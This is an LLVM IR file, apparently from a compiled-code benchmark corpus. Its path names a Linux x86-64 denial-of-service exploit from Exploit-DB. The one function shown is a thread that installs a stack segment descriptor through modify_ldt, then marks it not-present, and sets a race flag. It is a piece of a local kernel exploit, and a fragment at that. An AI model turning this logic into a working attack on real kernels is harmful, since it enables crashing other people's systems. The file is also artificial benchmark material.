; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/dos/extr_36266.c_segManipulatorThread.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/dos/extr_36266.c_segManipulatorThread.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i32, i32, i32, i32, i32, i64, i64, i64, i64, i32 }

@new_stack_segment = common dso_local global %struct.TYPE_3__ zeroinitializer, align 8
@MODIFY_LDT_CONTENTS_STACK = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"newSS\00", align 1
@.str.1 = private unnamed_addr constant [14 x i8] c"newSS disable\00", align 1
@FLAG = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @segManipulatorThread(i8* %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 18, i32* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @new_stack_segment, i32 0, i32 0), align 8
  store i32 65536, i32* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @new_stack_segment, i32 0, i32 1), align 4
  store i32 65535, i32* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @new_stack_segment, i32 0, i32 2), align 8
  store i32 1, i32* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @new_stack_segment, i32 0, i32 3), align 4
  %3 = load i32, i32* @MODIFY_LDT_CONTENTS_STACK, align 4
  store i32 %3, i32* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @new_stack_segment, i32 0, i32 9), align 8
  store i64 0, i64* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @new_stack_segment, i32 0, i32 8), align 8
  store i64 0, i64* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @new_stack_segment, i32 0, i32 7), align 8
  store i32 0, i32* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @new_stack_segment, i32 0, i32 4), align 8
  store i64 0, i64* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @new_stack_segment, i32 0, i32 6), align 8
  store i64 0, i64* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @new_stack_segment, i32 0, i32 5), align 8
  %4 = call i32 @add_ldt(%struct.TYPE_3__* @new_stack_segment, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %5 = call i32 @sleep(i32 3)
  store i32 1, i32* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @new_stack_segment, i32 0, i32 4), align 8
  %6 = call i32 @add_ldt(%struct.TYPE_3__* @new_stack_segment, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* @FLAG, align 4
  %7 = call i32 @sleep(i32 15)
  ret i8* null
}

declare dso_local i32 @add_ldt(%struct.TYPE_3__*, i8*) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
